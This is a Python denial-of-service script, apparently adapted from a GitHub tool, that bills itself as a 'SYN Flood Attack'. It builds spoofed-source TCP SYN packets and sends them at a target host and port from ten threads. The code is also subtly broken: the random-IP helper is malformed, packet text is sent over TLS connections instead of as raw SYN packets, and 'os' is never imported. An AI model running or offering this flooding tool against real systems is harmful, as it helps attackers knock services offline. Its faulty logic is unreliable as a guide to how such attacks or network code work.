import random
import socket
import ssl
import logging
import threading
import time
from scapy.all import IP, TCP

logging.basicConfig(filename="syn_flood.log", level=logging.INFO)


def randomIP():
    return ".".join(str(random.randint(0, 255) for _ in range(4)))


def randInt():
    return random.randint(1000, 9000)


def SYN_Flood(dstIP, dstPort, counter, rate_limit=None):
    total = 0
    print("Packets are being sent ...")

    context = ssl.create_default_context()

    def send_packet():
        nonlocal total
        for x in range(counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP(src=randomIP(), dst=dstIP)
            TCP_Packet = TCP(
                sport=s_port, dport=dstPort, flags="S", seq=s_eq, window=w_indow
            )

            try:
                with socket.create_connection((dstIP, dstPort)) as s:
                    with context.wrap_socket(s, server_hostname=dstIP) as ss:
                        ss.sendall(bytes(str(IP_Packet / TCP_Packet), "utf-8"))
                total += 1
                if rate_limit:
                    time.sleep(1 / rate_limit)
            except Exception as e:
                logging.error(f"Error sending packet: {e}")

    threads = []
    for _ in range(10):  # Sesuaikan jumlah thread sesuai kebutuhan
        thread = threading.Thread(target=send_packet)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Total packets sent: {total}")


def info():
    if os.name == "posix":
        os.system("clear")
    elif os.name == "nt":
        os.system("cls")
    print("#" * 29)
    print("#    github.com/EmreOvunc   #")
    print("#" * 29)
    print("# Welcome to SYN Flood Attack! #")
